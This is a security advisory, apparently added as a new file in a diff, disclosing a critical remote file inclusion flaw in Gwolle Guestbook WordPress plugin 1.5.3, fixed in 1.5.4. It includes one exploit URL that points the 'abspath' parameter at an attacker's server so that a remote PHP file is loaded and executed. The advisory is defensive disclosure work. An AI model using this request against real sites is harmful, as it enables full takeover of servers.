@@ -1,0 +1,53 @@
+Advisory ID: HTB23275
+Product: Gwolle Guestbook WordPress Plugin
+Vendor: Marcel Pol
+Vulnerable Version(s): 1.5.3 and probably prior
+Tested Version: 1.5.3
+Advisory Publication:  October 14, 2015  [without technical details]
+Vendor Notification: October 14, 2015 
+Vendor Patch: October 16, 2015 
+Public Disclosure: November 4, 2015 
+Vulnerability Type: PHP File Inclusion [CWE-98]
+CVE Reference: CVE-2015-8351
+Risk Level: Critical 
+CVSSv3 Base Score: 9.0 [CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H]
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered a critical Remote File Inclusion (RFI) in Gwolle Guestbook WordPress plugin, which can be exploited by non-authenticated attacker to include remote PHP file and execute arbitrary code on the vulnerable system.  
+
+HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:
+
+http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
+
+In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker may still include local files and also execute arbitrary code. 
+
+Successful exploitation of this vulnerability will lead to entire WordPress installation compromise, and may even lead to the entire web server compromise. 
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to Gwolle Guestbook 1.5.4
+
+More Information:
+https://wordpress.org/plugins/gwolle-gb/changelog/
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23275 - https://www.htbridge.com/advisory/HTB23275 - PHP File Inclusion in Gwolle Guestbook WordPress Plugin.
+[2] Gwolle Guestbook WordPress Plugin - https://wordpress.org/plugins/gwolle-gb/ - Gwolle Guestbook is the WordPress guestbook you've just been looking for.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
